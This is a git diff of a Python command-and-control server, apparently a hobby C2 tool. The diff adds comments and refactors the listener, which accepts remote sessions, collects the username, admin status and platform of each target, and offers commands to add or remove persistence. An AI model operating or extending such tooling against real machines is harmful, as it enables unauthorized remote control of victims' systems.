@@ -20,25 +20,41 @@ def banner():
     print('███████ ██   ██ ██   ████  ██████ ███████  by Sanchious')
 
 
+# Handling inbound messages based on the target connection - returning decoded message
 def inbound_message(remote_target):
     print(f'[+] Awaiting response...')
     response = session_id.recv(1024).decode()
     return response
 
 
+# Handling outbound message based on the target connection - sending encoded message
 def outbound_message(remote_target, message):
     session_id.send(message.encode())
 
 
+# Start a TCP socket listener based on Network Interface/IPv4 and Port provided from user input
+# Handing over the connection received to the message handler in a separate thread for each connection
 def listener_handler():
+    while True:
+        user_input = input(
+            "Enter an IPv4 address or a network interface name: ")
+        if check_input(user_input) is not False:
+            host_ip = check_input(user_input)
+            print(f'lhost ==> {host_ip}')
+            break
+        else:
+            print(
+                f"\'{user_input}\' is neither a valid IPv4 address nor a valid network interface name.")
+    host_port = input('[*] Enter Local Port to listen on: ')
+    print(f'lport ==> {host_port}')
     sock.bind((host_ip, int(host_port)))
-    print(
-        f'[*] Started listener on {host_ip} port {host_port}...\n')
+    print(f'[*] Started listener on {host_ip} port {host_port}...\n')
     sock.listen()
     t1 = threading.Thread(target=message_handler)
     t1.start()
 
 
+# Processing receiving connections details with 3 additional initial messages: Username, isAdmin, platform type and storing them into Sessions list.
 def message_handler():
     while True:
         if exit_flag == True:
@@ -73,6 +89,7 @@ def message_handler():
             pass
 
 
+# Individual session handling with options: exit, backgroung, help (TODO), add/remove persistence
 def session_handler(session_id):
     while True:
         message = input('Session command#> ')
@@ -204,18 +221,6 @@ if __name__ == '__main__':
         try:
             command = input('Enter command#> ')
             if command == 'start listener':
-                while True:
-                    user_input = input(
-                        "Enter an IPv4 address or a network interface name: ")
-                    if check_input(user_input) is not False:
-                        host_ip = check_input(user_input)
-                        print(f'lhost ==> {host_ip}')
-                        break
-                    else:
-                        print(
-                            f"\'{user_input}\' is neither a valid IPv4 address nor a valid network interface name.")
-                host_port = input('[*] Enter Local Port to listen on: ')
-                print(f'lport ==> {host_port}')
                 listener_handler()
                 listener_counter += 1
             if command.split(' ')[0] == 'sessions':
